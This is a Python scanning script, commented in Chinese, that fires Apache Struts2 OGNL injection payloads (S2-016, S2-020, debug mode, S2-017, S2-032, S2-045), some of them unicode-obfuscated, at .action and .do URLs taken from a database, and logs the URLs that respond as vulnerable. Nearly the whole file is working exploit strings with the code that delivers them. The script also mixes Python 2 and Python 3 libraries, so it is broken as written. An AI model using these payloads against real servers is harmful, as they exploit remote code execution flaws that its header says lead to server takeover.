# Name:Struts2远程代码执行集合
# Descript:可直接执行任意代码,进而直接导致服务器被入侵控制.
# refer:https://raw.githubusercontent.com/boy-hack/w8scan/master/py/poc/st2_eval.py
import urllib2
import sys
import re
from urllib.parse import urlparse
from exp10it import get_target_urls_from_db
from exp10it import CLIOutput
modulePath = __file__[:-len(__file__.split("/")[-1])]
flag_list = {
    "S2_016": {"poc": [
        "redirect:${%23out%3D%23\u0063\u006f\u006e\u0074\u0065\u0078\u0074.\u0067\u0065\u0074(new \u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072(),%23\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e(\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074,%23\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065()}"],
        "key": "QtestQ"},
    "S2_020": {
        "poc": ["class[%27classLoader%27][%27jarPath%27]=1024", "class[%27classLoader%27][%27resources%27]=1024"],
        "key": "No result defined for action"},
    "S2_DEBUG": {"poc": [
        "debug=command&expression=%23f%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticM%27%2b%27ethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23o%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23o.println(%27[%27%2b%27ok%27%2b%27]%27),%23o.close()"],
        "key": "[ok]"},
    "S2_017_URL": {"poc": ["redirect:http://360.cn/", "redirectAction:http://360.cn/%23"],
                   "key": "http://www.360.cn/favicon.ico"},
    "S2_032": {"poc": [
        "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(66666666-2),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"],
        "key": "66666664"},
    "S2_045": {"poc": [
        "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('['+'xunfeng'+']')).(#o.close())}"],
        "key": "[xunfeng]"}
}

target = sys.argv[1]
urls = get_target_urls_from_db(target, "exp10itdb")
for eachUrl in urls:
    if "^" in eachUrl:
        eachUrl = eachUrl.split("^")[0]
    parsed = urlparse(eachUrl)
    url = parsed.scheme + "://" + parsed.netloc + parsed.path
    if re.search("\.action|\.do", url):
        for ver in flag_list:
            for poc in flag_list[ver]['poc']:
                try:
                    if ver == "S2_045":
                        request = urllib2.Request(url)
                        request.add_header("Content-Type", poc)
                    else:
                        request = urllib2.Request(url, poc)
                    res_html = urllib2.urlopen(request).read(204800)
                    if flag_list[ver]['key'] in res_html:
                        string_to_write = "Congratulations! 存在struts2漏洞! ver:%s\npoc:\n%s" % (ver, poc)
                        CLIOutput.good_print(string_to_write)
                        with open("%sresult.txt" % modulePath, "a+") as f:
                            f.write(string_to_write)
                except:
                    pass
